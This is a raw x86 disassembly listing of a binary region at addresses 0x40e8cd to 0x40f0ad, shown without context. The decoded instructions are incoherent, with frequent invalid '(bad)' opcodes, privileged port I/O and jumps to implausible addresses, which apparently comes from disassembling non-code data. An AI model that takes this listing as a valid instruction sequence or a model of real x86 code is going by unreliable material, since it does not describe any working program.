  40e8cd:	pop    es
  40e8ce:	(bad)
  40e8d1:	fldpi  
  40e8d3:	loope  0x40e8b4
  40e8d5:	or     edx,edi
  40e8d7:	fsubr  QWORD PTR [ecx-0x1a523842]
  40e8dd:	loopne 0x40e8c1
  40e8df:	into   
  40e8e0:	(bad)  
  40e8e1:	mov    edi,0xcdd5f9d2
  40e8e6:	jecxz  0x40e8ea
  40e8e8:	shl    esi,1
  40e8ea:	add    esp,esp
  40e8ec:	fdiv   st(5),st
  40e8ee:	mov    eax,0xd5f5dad0
  40e8f3:	(bad)  
  40e8f4:	loop   0x40e8f8
  40e8f6:	add    ch,ah
  40e8f8:	shl    bh,0xe5
  40e8fb:	lods   al,BYTE PTR ds:[esi]
  40e8fc:	(bad)
  40e8ff:	imul   DWORD PTR [esi-0xd054525]
  40e905:	mov    ecx,0xcdf0f9f4
  40e90a:	fucom  st(3)
  40e90c:	add    eax,DWORD PTR ds:0x6ebbfdc
  40e912:	add    eax,0x6ee0fdd
  40e917:	fincstp 
  40e919:	xlat   BYTE PTR ds:[ebx]
  40e91a:	xlat   BYTE PTR ds:[ebx]
  40e91b:	ror    cl,cl
  40e91d:	int    0xd4
  40e91f:	mov    ecx,0xb4eed9c7
  40e924:	in     eax,dx
  40e925:	shl    ebx,1
  40e927:	add    ebp,edx
  40e929:	cld    
  40e92a:	mov    eax,0xf0fdf9d8
  40e92f:	cld    
  40e930:	out    0xe0,al
  40e932:	jecxz  0x40e931
  40e934:	in     eax,0xf
  40e936:	std    
  40e937:	mov    eax,0xefd7aedf
  40e93c:	cmc    
  40e93d:	out    0xb7,al
  40e93f:	clc    
  40e940:	mov    dh,0xe9
  40e942:	aam    0xfb
  40e944:	int3   
  40e945:	icebp  
  40e946:	repnz repz hlt 
  40e949:	(bad)  
  40e94b:	rcl    ch,0xd5
  40e94e:	cld    
  40e94f:	out    0xe6,al
  40e951:	idiv   dh
  40e953:	add    ecx,esp
  40e955:	leave  
  40e956:	adc    ch,BYTE PTR [eax+ebp*8-0x2d0b0e54]
  40e95d:	fidiv  DWORD PTR [ebp-0x28070847]
  40e963:	imul   dh
  40e965:	fnclex 
  40e967:	fcmovb st,st(0)
  40e969:	cli    
  40e96a:	push   es
  40e96b:	ret    
  40e96c:	in     al,0xb9
  40e96e:	or     DWORD PTR [ecx+ecx*8],eax
  40e971:	or     ecx,DWORD PTR ds:0xc900e0c5
  40e977:	mov    eax,0xcfb1c1bc
  40e97c:	repz mov bh,0xc8
  40e97f:	int3   
  40e980:	retf   
  40e981:	fcmovne st,st(6)
  40e983:	ror    al,1
  40e985:	shr    edx,cl
  40e987:	mov    ebp,0x7d8d3d3
  40e98c:	push   ebx
  40e98e:	or     esp,edi
  40e990:	add    eax,0xecc9eae6
  40e995:	out    0xe2,al
  40e997:	jmp    0xd6129879
  40e99c:	enter  0xd3d2,0xf8
  40e9a0:	shl    ebp,cl
  40e9a2:	clc    
  40e9a3:	icebp  
  40e9a4:	mov    ebx,0xfdedbbe2
  40e9a9:	int    0xbe
  40e9ab:	fiadd  DWORD PTR ds:0xc6d9c4e0
  40e9b1:	push   es
  40e9b2:	(bad)  
  40e9b3:	fabs   
  40e9b5:	repnz adc esi,DWORD PTR [ebx-0xa2c483e]
  40e9bc:	ret    
  40e9bd:	int    0xc5
  40e9bf:	out    0xf7,al
  40e9c1:	clc    
  40e9c2:	(bad)  
  40e9c4:	mov    ebx,0xf0f0d0df
  40e9c9:	shl    al,cl
  40e9cb:	ret    0xf2de
  40e9ce:	in     al,0x7
  40e9d0:	add    ecx,DWORD PTR [edi]
  40e9d2:	pop    es
  40e9d3:	jmp    0xe021c6d8
  40e9d8:	mov    esp,0xd4e6efad
  40e9dd:	ret    0xefe0
  40e9e0:	aam    0xfe
  40e9e2:	shr    esp,1
  40e9e4:	jmp    0x40e9b4
  40e9e6:	aad    0xba
  40e9e8:	out    dx,eax
  40e9e9:	add    dh,dl
  40e9eb:	pop    es
  40e9ec:	lds    eax,FWORD PTR [ebx]
  40e9ee:	jmp    0x40e9e8
  40e9f0:	fcmovne st,st(2)
  40e9f2:	push   cs
  40e9f3:	ret    
  40e9f4:	repz fucomip st,st(3)
  40e9f7:	stos   BYTE PTR es:[edi],al
  40e9f8:	retf   
  40e9f9:	(bad)  
  40e9fa:	out    dx,al
  40e9fb:	mov    cl,0xd1
  40e9fd:	mov    ch,0xf1
  40e9ff:	fsubr  DWORD PTR [esi-0x3321094b]
  40ea05:	hlt    
  40ea06:	clc    
  40ea07:	jmp    0xdb2ea3da
  40ea0c:	rcr    ecx,0xc7
  40ea0f:	jecxz  0x40e9d8
  40ea11:	(bad)  
  40ea12:	fcmovne st,st(2)
  40ea14:	in     al,dx
  40ea15:	std    
  40ea16:	into   
  40ea17:	out    0xd2,al
  40ea19:	jmp    0x40ea10
  40ea1b:	enter  0xf0ee,0xe7
  40ea1f:	jmp    0x40ea17
  40ea21:	cli    
  40ea22:	(bad)  
  40ea23:	in     al,dx
  40ea24:	mov    esi,0xefe2dccb
  40ea29:	fsubrp st(3),st
  40ea2b:	lock (bad) 
  40ea2d:	hlt    
  40ea2e:	ret    0xf705
  40ea31:	in     eax,0xed
  40ea33:	in     al,dx
  40ea34:	fstp   st(1)
  40ea36:	fsubr  st,st(3)
  40ea38:	retf   0xb1c7
  40ea3b:	retf   
  40ea3c:	(bad)  
  40ea3d:	in     al,0xbb
  40ea3f:	rol    edi,0xc8
  40ea42:	in     eax,0xbe
  40ea44:	fidiv  DWORD PTR [ecx-0x273cfc1f]
  40ea4a:	cmc    
  40ea4b:	mov    edi,0x7cbf3ff
  40ea50:	add    ch,dh
  40ea52:	leave  
  40ea53:	out    0x4,eax
  40ea55:	(bad)  
  40ea57:	mov    bl,0xcd
  40ea59:	fisubr WORD PTR [ebp-0x4f0e1d3a]
  40ea5f:	repnz xlat BYTE PTR ds:[ebx]
  40ea61:	retf   
  40ea62:	rcl    edi,1
  40ea64:	fnstcw WORD PTR [edx-0xa0b2113]
  40ea6a:	xlat   BYTE PTR ds:[ebx]
  40ea6b:	add    eax,0xc5d102dc
  40ea70:	enter  0x6da,0xd8
  40ea74:	jmp    0xc3bf:0xd0c6c9de
  40ea7b:	in     al,dx
  40ea7c:	int3   
  40ea7d:	leave  
  40ea7e:	out    0xf9,al
  40ea80:	in     eax,dx
  40ea81:	mov    edi,0xd8dadae5
  40ea86:	shl    al,cl
  40ea88:	icebp  
  40ea89:	ret    0xbbd3
  40ea8c:	(bad)  
  40ea8d:	aam    0xf5
  40ea8f:	retf   0xc9cb
  40ea92:	out    dx,eax
  40ea93:	or     ah,cl
  40ea95:	loope  0x40ea81
  40ea97:	out    0xd1,eax
  40ea99:	jmp    0x40ea5b
  40ea9b:	aam    0xc8
  40ea9d:	in     al,dx
  40ea9e:	retf   0xb6c4
  40eaa1:	mov    ebx,0xedd4f9f8
  40eaa6:	fiadd  WORD PTR [ebx]
  40eaa8:	iret   
  40eaa9:	aam    0xe0
  40eaab:	icebp  
  40eaac:	inc    BYTE PTR [edi+eax*1]
  40eaaf:	add    edi,ebp
  40eab1:	sti    
  40eab2:	out    dx,eax
  40eab3:	(bad)  
  40eab4:	les    eax,FWORD PTR [edx]
  40eab6:	adc    ebp,DWORD PTR [esi-0x34293654]
  40eabc:	(bad)  
  40eabd:	aam    0xe2
  40eabf:	in     eax,dx
  40eac0:	loopne 0x40eaa1
  40eac2:	lods   al,BYTE PTR ds:[esi]
  40eac3:	in     al,dx
  40eac4:	out    dx,al
  40eac5:	fcmovnb st,st(3)
  40eac7:	(bad)  
  40eac9:	cli    
  40eaca:	cli    
  40eacb:	int3   
  40eacc:	out    0xbd,al
  40eace:	repnz add bl,ah
  40ead1:	push   cs
  40ead2:	fisttp QWORD PTR [edx]
  40ead4:	loop   0x40eae4
  40ead6:	rol    esi,cl
  40ead8:	mov    cl,0xc3
  40eada:	div    DWORD PTR [ebp-0x354d0e25]
  40eae0:	int3   
  40eae1:	mov    eax,0xfebdced6
  40eae6:	repnz mov eax,0xd4dff2cd
  40eaec:	mov    ebp,0xfdfbded5
  40eaf1:	aam    0xed
  40eaf3:	or     ch,ch
  40eaf5:	dec    DWORD PTR [ebp*8-0x2e42573e]
  40eafc:	jmp    0xf3cc:0xb2eff7c9
  40eb03:	jmp    0xf5f1dbd3
  40eb08:	repnz add dl,ah
  40eb0b:	icebp  
  40eb0c:	cmc    
  40eb0d:	(bad)  
  40eb0f:	push   es
  40eb10:	add    BYTE PTR [esi],cl
  40eb12:	aam    0xc3
  40eb14:	clc    
  40eb15:	retf   0xc912
  40eb18:	mov    esp,0xdbc7c3e7
  40eb1d:	mov    cl,0xd6
  40eb1f:	in     al,0xb1
  40eb21:	repnz neg ebx
  40eb24:	mov    eax,0xf7f8f2b1
  40eb29:	mov    esp,0xf5e3d500
  40eb2e:	xlat   BYTE PTR ds:[ebx]
  40eb2f:	in     al,0xe8
  40eb31:	cld    
  40eb32:	add    eax,esp
  40eb34:	retf   0xd8c5
  40eb37:	fdivrp st(0),st
  40eb39:	mov    ebp,0xb4c4f7c8
  40eb3e:	into   
  40eb3f:	lock jmp 0xd9d7:0xeec4f3ca
  40eb47:	lock in al,dx
  40eb49:	out    dx,eax
  40eb4a:	cmc    
  40eb4b:	(bad)  
  40eb4c:	(bad)  
  40eb4d:	(bad)  
  40eb4f:	hlt    
  40eb50:	(bad)  
  40eb51:	call   0x131aae61
  40eb56:	adc    eax,eax
  40eb58:	mov    bl,0xdc
  40eb5a:	(bad)
  40eb5e:	(bad)  
  40eb5f:	mov    edx,0xb7c6ccda
  40eb64:	jmp    0xe6cc:0xf0b7c9d6
  40eb6b:	idiv   bh
  40eb6d:	aam    0xf0
  40eb6f:	ret    
  40eb70:	lock fucomp st(5)
  40eb73:	fsub   st(1),st
  40eb75:	pop    es
  40eb76:	pop    es
  40eb77:	out    0xe9,eax
  40eb79:	rol    esi,0xd3
  40eb7c:	stos   BYTE PTR es:[edi],al
  40eb7d:	mov    ch,0xba
  40eb7f:	iret   
  40eb80:	jmp    0xd50abc6e
  40eb85:	sti    
  40eb86:	int    0x2
  40eb88:	aam    0xcd
  40eb8a:	rol    bl,cl
  40eb8c:	neg    ebx
  40eb8e:	aam    0xe6
  40eb90:	retf   0x6e5
  40eb93:	add    esp,edi
  40eb95:	retf   
  40eb96:	out    0xaf,al
  40eb98:	mov    esp,0xf7f1aec9
  40eb9d:	mov    cl,0xd0
  40eb9f:	retf   
  40eba0:	(bad)  
  40eba1:	in     eax,0xe4
  40eba3:	aad    0xd5
  40eba5:	in     al,dx
  40eba6:	cli    
  40eba7:	leave  
  40eba8:	(bad)  
  40ebaa:	out    dx,al
  40ebab:	sar    edi,cl
  40ebad:	std    
  40ebae:	fdiv   st,st(4)
  40ebb0:	(bad)  
  40ebb1:	push   es
  40ebb2:	(bad)  
  40ebb3:	fxch   st(0)
  40ebb5:	sar    ecx,0xa8
  40ebb8:	out    dx,al
  40ebb9:	mov    esi,0xeff3bdcc
  40ebbe:	mov    dh,0xda
  40ebc0:	in     eax,0xe9
  40ebc2:	(bad)  
  40ebc3:	xlat   BYTE PTR ds:[ebx]
  40ebc4:	mov    ebx,0xdcb8d302
  40ebc9:	mov    ecx,0xd2c5e1cc
  40ebce:	retf   
  40ebcf:	jmp    0x40ebd2
  40ebd1:	jmp    0xe5df:0xec0dcdfe
  40ebd8:	repz ror ah,1
  40ebdb:	div    al
  40ebdd:	int    0xf3
  40ebdf:	int3   
  40ebe0:	mov    bh,0xee
  40ebe2:	(bad)  
  40ebe4:	mov    esp,0xd0fddfd4
  40ebe9:	(bad)  
  40ebea:	in     eax,dx
  40ebeb:	(bad)
  40ebef:	ret    0xc4e3
  40ebf2:	dec    BYTE PTR [ebx]
  40ebf4:	iret   
  40ebf5:	rcl    DWORD PTR [ecx],cl
  40ebf7:	stos   BYTE PTR es:[edi],al
  40ebf8:	jecxz  0x40ebe4
  40ebfa:	shl    BYTE PTR [edx-0x49244b3b],0xef
  40ec01:	in     al,dx
  40ec02:	mov    esi,0x3d0f1fe
  40ec07:	repz out dx,al
  40ec09:	push   es
  40ec0a:	out    0xf8,al
  40ec0c:	jecxz  0x40ec10
  40ec0e:	sti    
  40ec0f:	fdiv   st,st(7)
  40ec11:	out    dx,al
  40ec12:	fsubr  st,st(2)
  40ec14:	sti    
  40ec15:	or     ecx,ebp
  40ec17:	sar    BYTE PTR [esi-0x23142d44],1
  40ec1d:	lock retf 0xf0f7
  40ec21:	leave  
  40ec22:	mov    dh,0xd1
  40ec24:	add    edi,DWORD PTR [edx-0x2d01332a]
  40ec2a:	rcr    dh,1
  40ec2c:	cld    
  40ec2d:	sti    
  40ec2e:	(bad)  
  40ec2f:	loopne 0x40ec0b
  40ec31:	xlat   BYTE PTR ds:[ebx]
  40ec32:	out    0xe9,al
  40ec34:	fcmovu st,st(7)
  40ec36:	into   
  40ec37:	loop   0x40ebe6
  40ec39:	mov    ebp,0xe3ccf2b0
  40ec3e:	jmp    0xf8cc:0xb5f3b2f7
  40ec45:	hlt    
  40ec46:	(bad)  
  40ec48:	div    al
  40ec4a:	int3   
  40ec4b:	add    ebx,ebx
  40ec4d:	repnz clc 
  40ec4f:	cld    
  40ec50:	aam    0x1
  40ec52:	(bad)  [ecx]
  40ec54:	or     ch,ch
  40ec56:	out    dx,al
  40ec57:	fucom  st(3)
  40ec59:	jmp    0xf82dad42
  40ec5e:	lock retf 
  40ec60:	(bad)  
  40ec61:	out    dx,al
  40ec62:	mov    bh,0xc9
  40ec64:	int    0xba
  40ec66:	clc    
  40ec67:	(bad)  
  40ec69:	add    bh,BYTE PTR [esi-0x433bf43d]
  40ec6f:	fstp   st(6)
  40ec71:	jecxz  0x40ec4b
  40ec73:	add    eax,esp
  40ec75:	fld    DWORD PTR [ecx]
  40ec77:	into   
  40ec78:	iret   
  40ec79:	mov    cl,0xf2
  40ec7b:	into   
  40ec7c:	hlt    
  40ec7d:	(bad)  
  40ec7e:	les    esi,FWORD PTR [ebp-0x26201636]
  40ec84:	xlat   BYTE PTR ds:[ebx]
  40ec85:	mov    cl,0xef
  40ec87:	ret    0xd5f2
  40ec8a:	cmc    
  40ec8b:	loopne 0x40ec6e
  40ec8d:	retf   
  40ec8e:	stc    
  40ec8f:	retf   
  40ec90:	fxam   
  40ec92:	into   
  40ec93:	pop    es
  40ec94:	in     eax,0xfa
  40ec96:	bts    edi,ecx
  40ec99:	fmul   st(3),st
  40ec9b:	rcr    ebx,1
  40ec9d:	out    0xb3,eax
  40ec9f:	(bad)  
  40eca0:	(bad)  
  40eca2:	retf   0xefee
  40eca5:	mov    edi,0xcec3dddf
  40ecaa:	in     al,dx
  40ecab:	not    eax
  40ecad:	pop    es
  40ecae:	std    
  40ecaf:	leave  
  40ecb0:	cld    
  40ecb1:	cld    
  40ecb2:	sti    
  40ecb3:	jmp    0x40ecb8
  40ecb5:	sti    
  40ecb6:	loopne 0x40ec7f
  40ecb8:	shl    edx,0xb1
  40ecbb:	loopne 0x40ecab
  40ecbd:	leave  
  40ecbe:	mov    ebx,0xbffabaef
  40ecc3:	(bad)  
  40ecc4:	mov    dh,0xbc
  40ecc6:	repz repnz hlt 
  40ecc9:	shl    ah,0xe2
  40eccc:	rol    ecx,1
  40ecce:	mov    esp,0x1e1d5d1
  40ecd3:	loope  0x40ecd3
  40ecd5:	enter  0xd9da,0xbc
  40ecd9:	jecxz  0x40eca6
  40ecdb:	lock lods al,BYTE PTR ds:[esi]
  40ecdd:	call   0xd9f89d98
  40ece2:	mov    edi,0xeadfd6d0
  40ece7:	loopne 0x40ecb8
  40ece9:	iret   
  40ecea:	loope  0x40eca9
  40ecec:	(bad)  
  40eced:	in     al,0x7
  40ecef:	loop   0x40ece1
  40ecf1:	loope  0x40ed02
  40ecf3:	dec    BYTE PTR [ebx]
  40ecf5:	pop    es
  40ecf6:	jmp    0x40eca9
  40ecf8:	vpaddusw xmm4,xmm3,xmm4
  40ecfc:	repnz out 0xf1,eax
  40ecff:	int3   
  40ed00:	les    edi,FWORD PTR [edi-0x2d452954]
  40ed06:	shr    esp,1
  40ed08:	repz ret 0xf201
  40ed0c:	jmp    0x40ed14
  40ed0e:	add    al,dh
  40ed10:	add    bh,ch
  40ed12:	vcmpps xmm4,xmm3,xmm4,0xf2
  40ed17:	ror    ah,cl
  40ed19:	leave  
  40ed1a:	leave  
  40ed1b:	repnz in eax,dx
  40ed1d:	repz sar DWORD PTR [ecx-0x41093721],cl
  40ed24:	sti    
  40ed25:	loop   0x40ecfe
  40ed27:	mov    esp,0xfed8f5ee
  40ed2c:	mov    esp,0xeb00fcd0
  40ed31:	leave  
  40ed32:	loop   0x40ed38
  40ed34:	int    0x7
  40ed36:	(bad)  [esi-0x8493442]
  40ed3c:	shl    bh,1
  40ed3e:	aad    0xc8
  40ed40:	int    0xd4
  40ed42:	mov    ch,0xfd
  40ed44:	in     al,dx
  40ed45:	mov    edi,0xe0dddcf3
  40ed4a:	clc    
  40ed4b:	add    eax,esi
  40ed4d:	std    
  40ed4e:	aam    0xe6
  40ed50:	(bad)  
  40ed52:	stc    
  40ed53:	jecxz  0x40ed24
  40ed55:	repz (bad) 
  40ed58:	loop   0x40ed16
  40ed5a:	loopne 0x40ed0c
  40ed5c:	lods   al,BYTE PTR ds:[esi]
  40ed5d:	vpaddsb xmm5,xmm3,xmm7
  40ed61:	iret   
  40ed62:	repnz sti 
  40ed64:	fcmove st,st(3)
  40ed66:	div    esp
  40ed68:	neg    ebp
  40ed6a:	jecxz  0x40ed6a
  40ed6c:	xlat   BYTE PTR ds:[ebx]
  40ed6d:	in     al,0xc1
  40ed6f:	retf   0xdeda
  40ed72:	out    dx,al
  40ed73:	std    
  40ed74:	int3   
  40ed75:	jmp    0xeffece57
  40ed7a:	lock (bad) 
  40ed7c:	in     eax,dx
  40ed7d:	sti    
  40ed7e:	lods   al,BYTE PTR ds:[esi]
  40ed7f:	(bad)  
  40ed80:	call   ecx
  40ed82:	not    ecx
  40ed84:	les    edi,FWORD PTR [ebx-0x4afc1345]
  40ed8a:	ret    
  40ed8b:	add    bl,al
  40ed8d:	repnz cld 
  40ed8f:	test   dh,0xdc
  40ed92:	retf   0xfaff
  40ed95:	loop   0x40ed95
  40ed97:	iret   
  40ed98:	(bad)
  40ed9b:	(bad)  
  40ed9c:	mov    esp,0xc8ccebee
  40eda1:	rcl    dh,cl
  40eda3:	out    dx,al
  40eda4:	retf   
  40eda5:	cli    
  40eda6:	lock fdivp st(1),st
  40eda9:	fidivr WORD PTR [edx+eiz*8-0x3e160d2e]
  40edb0:	hlt    
  40edb1:	(bad)  
  40edb2:	clc    
  40edb3:	add    cl,cl
  40edb5:	push   es
  40edb6:	(bad)  
  40edb7:	in     eax,dx
  40edb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edb9:	mov    dl,0xd7
  40edbb:	(bad)
  40edbe:	out    dx,al
  40edbf:	aad    0xb1
  40edc1:	fxtract 
  40edc3:	retf   0xebcb
  40edc6:	jmp    0xb521dda3
  40edcb:	aam    0xfe
  40edcd:	loop   0x40edc8
  40edcf:	(bad)  
  40edd0:	fcomi  st,st(5)
  40edd2:	(bad)  
  40edd3:	aad    0xdb
  40edd5:	sti    
  40edd6:	shl    dl,cl
  40edd8:	repz mov bh,0xdc
  40eddb:	ffree  st(6)
  40eddd:	mov    cl,0xd7
  40eddf:	out    0xf7,al
  40ede1:	in     eax,dx
  40ede2:	xlat   BYTE PTR ds:[ebx]
  40ede3:	fsubr  st,st(5)
  40ede5:	leave  
  40ede6:	(bad)  
  40ede8:	test   DWORD PTR [ecx],0xe6ccfee1
  40edee:	(bad)  
  40edef:	or     DWORD PTR [edx],ecx
  40edf1:	add    DWORD PTR [eax],eax
  40edf3:	fisttp DWORD PTR [edi+ebx*8]
  40edf6:	or     bh,ah
  40edf8:	call   0xf311e1e2
  40edfd:	fcmovne st,st(4)
  40edff:	rol    ebp,1
  40ee01:	mov    ch,0xde
  40ee03:	cmc    
  40ee04:	int3   
  40ee05:	(bad)  
  40ee07:	add    ebx,esp
  40ee09:	xlat   BYTE PTR ds:[ebx]
  40ee0a:	shr    ch,0xc4
  40ee0d:	add    edi,ecx
  40ee0f:	mov    edi,0x2c6c5df
  40ee14:	or     al,0xe4
  40ee16:	out    0xc6,eax
  40ee18:	test   al,0xcf
  40ee1a:	mov    cl,0xee
  40ee1c:	mov    cl,0xca
  40ee1e:	jmp    0xf713dad6
  40ee23:	std    
  40ee24:	(bad)  
  40ee26:	jecxz  0x40edf1
  40ee28:	jecxz  0x40edec
  40ee2a:	fsubr  st(4),st
  40ee2c:	add    edi,edx
  40ee2e:	rcl    ch,0xc0
  40ee31:	or     bl,ch
  40ee33:	hlt    
  40ee34:	bswap  edi
  40ee36:	clc    
  40ee37:	scas   al,BYTE PTR es:[edi]
  40ee38:	int    0xa5
  40ee3a:	retf   0xc1b2
  40ee3d:	cli    
  40ee3e:	stc    
  40ee3f:	cmc    
  40ee40:	repnz mov bh,0xde
  40ee43:	mov    bh,0xea
  40ee45:	add    ebx,eax
  40ee47:	add    eax,ecx
  40ee49:	mov    ch,0xb4
  40ee4b:	add    ebx,edi
  40ee4d:	(bad)  
  40ee4e:	mov    esp,0x8f9ca01
  40ee53:	(bad)  
  40ee55:	into   
  40ee56:	add    eax,esp
  40ee58:	lods   al,BYTE PTR ds:[esi]
  40ee59:	iret   
  40ee5a:	in     al,dx
  40ee5b:	div    DWORD PTR [edi-0x473f1e40]
  40ee61:	mov    eax,0xb1f4d5ed
  40ee66:	lock (bad) 
  40ee69:	(bad)  
  40ee6a:	stc    
  40ee6b:	(bad)  
  40ee6c:	mov    ebp,0x6f7c0f2
  40ee71:	add    DWORD PTR [ecx*1-0x3c25271d],eax
  40ee78:	in     eax,0xc9
  40ee7a:	mov    dl,0xb6
  40ee7c:	in     al,dx
  40ee7d:	int3   
  40ee7e:	mov    ah,0xc1
  40ee80:	hlt    
  40ee81:	jmp    0xba31ec80
  40ee86:	in     eax,dx
  40ee87:	in     al,dx
  40ee88:	fdiv   DWORD PTR [ebp-0x1a0c3afa]
  40ee8e:	sti    
  40ee8f:	(bad)  
  40ee90:	(bad)  
  40ee92:	add    al,0xff
  40ee94:	out    0xc,al
  40ee96:	add    ah,dl
  40ee98:	mov    esi,0xebc8d3b7
  40ee9d:	rcl    ebx,0xe9
  40eea0:	retf   0xdadf
  40eea3:	jmp    ebx
  40eea5:	mov    ecx,0xcdd7d9ef
  40eeaa:	out    dx,al
  40eeab:	mov    ebp,0xdfbcc3da
  40eeb0:	call   0xe54dd893
  40eeb5:	add    ebp,ebx
  40eeb7:	shl    ecx,1
  40eeb9:	mov    edi,0xd7f0f0c2
  40eebe:	aam    0xf8
  40eec0:	fnstcw WORD PTR [edi-0x43150427]
  40eec6:	out    dx,eax
  40eec7:	add    edx,ecx
  40eec9:	mov    edi,0xe2f3ccbc
  40eece:	fcmovnu st,st(6)
  40eed0:	jmp    0xda04:0xc4c4bcca
  40eed7:	test   al,0xb1
  40eed9:	jmp    0xdb359caf
  40eede:	stc    
  40eedf:	repz jmp 0xdace:0xfae5acfa
  40eee7:	mov    bh,0x0
  40eee9:	sar    BYTE PTR [eax-0xd09013e],1
  40eeef:	(bad)  
  40eef0:	test   BYTE PTR [esi],0xed
  40eef3:	fdiv   st(3),st
  40eef5:	out    0xe9,eax
  40eef7:	in     eax,0xcc
  40eef9:	out    0xea,al
  40eefb:	shl    DWORD PTR [eax-0x2b270d57],0xd7
  40ef02:	shr    dh,cl
  40ef04:	call   0x1fe9fb
  40ef09:	repz dec ah
  40ef0c:	or     edi,esi
  40ef0e:	stc    
  40ef0f:	loope  0x40eed2
  40ef11:	pop    es
  40ef12:	add    eax,0xbeaebce
  40ef17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef18:	out    dx,al
  40ef19:	in     al,0xa8
  40ef1b:	in     al,dx
  40ef1c:	hlt    
  40ef1d:	aad    0xd6
  40ef1f:	into   
  40ef20:	jmp    0x40eeed
  40ef22:	(bad)
  40ef25:	mov    ecx,0xfdb9ded5
  40ef2a:	add    ebp,ebp
  40ef2c:	push   es
  40ef2d:	rol    esp,1
  40ef2f:	ret    0xbff
  40ef32:	add    edi,eax
  40ef34:	out    dx,eax
  40ef35:	enter  0xd2e6,0xe7
  40ef39:	mov    edi,0xe6e2d1ea
  40ef3e:	loop   0x40ef28
  40ef40:	mov    bh,0xc7
  40ef42:	in     al,0xc9
  40ef44:	sar    BYTE PTR [esi-0x80a3031],1
  40ef4a:	into   
  40ef4b:	hlt    
  40ef4c:	add    bl,ch
  40ef4e:	rol    esp,1
  40ef50:	(bad)
  40ef53:	fsubrp st(5),st
  40ef55:	jmp    0xd734de2d
  40ef5a:	jmp    0xeffb:0xd4c0b0ab
  40ef61:	out    dx,eax
  40ef62:	mov    bh,0xba
  40ef64:	(bad)  
  40ef66:	loope  0x40ef68
  40ef68:	fidivr DWORD PTR [edi-0x2c0b0c1e]
  40ef6e:	(bad)  
  40ef6f:	aam    0x9
  40ef71:	(bad)  
  40ef72:	(bad)  
  40ef73:	cmc    
  40ef74:	loope  0x40ef5c
  40ef76:	add    al,al
  40ef78:	scas   eax,DWORD PTR es:[edi]
  40ef79:	shl    cl,1
  40ef7b:	(bad)  
  40ef7c:	into   
  40ef7d:	fcmovu st,st(2)
  40ef7f:	aam    0xeb
  40ef81:	retf   
  40ef82:	fcmovnu st,st(4)
  40ef84:	(bad)  
  40ef85:	int    0xb4
  40ef87:	(bad)  
  40ef89:	repnz sar dl,cl
  40ef8c:	hlt    
  40ef8d:	(bad)
  40ef90:	(bad)  
  40ef92:	enter  0xe5f9,0x8
  40ef96:	fdivr  st(1),st
  40ef98:	mov    eax,0xbcecf2e6
  40ef9d:	aam    0xb5
  40ef9f:	out    dx,eax
  40efa0:	in     eax,0xc5
  40efa2:	mov    ch,0xde
  40efa4:	mov    ch,0xb5
  40efa6:	imul   ecx
  40efa8:	enter  0xbcef,0xc3
  40efac:	sti    
  40efad:	add    bh,ch
  40efaf:	xlat   BYTE PTR ds:[ebx]
  40efb0:	(bad)  
  40efb2:	iret   
  40efb3:	loopne 0x40efa2
  40efb5:	shl    edi,cl
  40efb7:	mov    dl,0xdc
  40efb9:	fmul   st(5),st
  40efbb:	stos   DWORD PTR es:[edi],eax
  40efbc:	in     al,0xf3
  40efbe:	lods   al,BYTE PTR ds:[esi]
  40efbf:	(bad)  
  40efc0:	mov    edx,0xdafcfaec
  40efc5:	in     al,dx
  40efc6:	bnd call 0xd6fea5bf
  40efcc:	ret    0xdccb
  40efcf:	cli    
  40efd0:	enter  0xffd5,0xf5
  40efd4:	stc    
  40efd5:	std    
  40efd6:	add    DWORD PTR [ebp-0x1e232239],ebp
  40efdc:	not    bl
  40efde:	jmp    0xf907c29a
  40efe3:	mov    edi,0xf1f7f1f2
  40efe8:	mov    ebp,0xd7d6d1f3
  40efed:	in     eax,0xd0
  40efef:	call   0x510b0d3
  40eff4:	aam    0x1
  40eff6:	rol    esi,cl
  40eff8:	ffree  st(3)
  40effa:	ret    
  40effb:	vfmadd213pd xmm6,xmm2,XMMWORD PTR [eax-0x1a4a4437]
  40f004:	retf   0xeada
  40f007:	loop   0x40efc6
  40f009:	cld    
  40f00a:	mov    ah,0xde
  40f00c:	in     eax,0xd9
  40f00e:	(bad)  
  40f00f:	cld    
  40f010:	not    edi
  40f012:	add    eax,esp
  40f014:	int3   
  40f015:	retf   
  40f016:	pop    es
  40f017:	in     al,dx
  40f018:	(bad)  
  40f019:	mov    ebp,0xace2c2c2
  40f01e:	test   al,0xe1
  40f020:	mov    al,0xf5
  40f022:	call   0xdb36ede0
  40f027:	int3   
  40f028:	cli    
  40f029:	cld    
  40f02a:	out    0xbc,al
  40f02c:	lock shl ah,0x9
  40f030:	lock push es
  40f032:	out    dx,al
  40f033:	or     eax,0xeb0100ee
  40f038:	loopne 0x40f001
  40f03a:	iret   
  40f03b:	mov    cl,0xed
  40f03d:	lock loope 0x40eff1
  40f040:	mov    ch,0xc4
  40f042:	jmp    0xfbbc:0xbffcd7ee
  40f049:	sti    
  40f04a:	neg    cl
  40f04c:	ret    
  40f04d:	out    0xc5,eax
  40f04f:	test   BYTE PTR [eax],0xe7
  40f052:	fscale 
  40f054:	out    0x6,al
  40f056:	stc    
  40f057:	out    dx,eax
  40f058:	lods   al,BYTE PTR ds:[esi]
  40f059:	repnz scas al,BYTE PTR es:[edi]
  40f05b:	mov    ebp,0xcdf1b0bc
  40f060:	fdiv   DWORD PTR [esi-0x31252a47]
  40f066:	rcl    ah,cl
  40f068:	cmc    
  40f069:	not    bl
  40f06b:	loope  0x40f030
  40f06d:	out    0xd6,eax
  40f06f:	call   0xc627f05f
  40f074:	fcmovu st,st(6)
  40f076:	push   cs
  40f077:	out    dx,eax
  40f078:	mov    eax,0xdcb5eba5
  40f07d:	aam    0xcf
  40f07f:	mov    cl,0xca
  40f081:	lods   eax,DWORD PTR ds:[esi]
  40f082:	out    dx,al
  40f083:	in     eax,0xb5
  40f085:	dec    dh
  40f087:	jecxz  0x40f05f
  40f089:	mov    edi,0xad2dbc2
  40f08e:	pop    es
  40f08f:	push   es
  40f090:	in     eax,0xc9
  40f092:	into   
  40f093:	fcmove st,st(6)
  40f095:	in     eax,0x11
  40f097:	stos   BYTE PTR es:[edi],al
  40f098:	in     al,dx
  40f099:	mov    bl,0xe0
  40f09b:	(bad)  
  40f09c:	out    dx,eax
  40f09d:	mov    ch,0xb7
  40f09f:	mov    dh,0xfb
  40f0a1:	mov    edx,0xbcb5c9c8
  40f0a6:	iret   
  40f0a7:	call   0x46e4ac
  40f0ac:	clc    
  40f0ad:	(bad)  
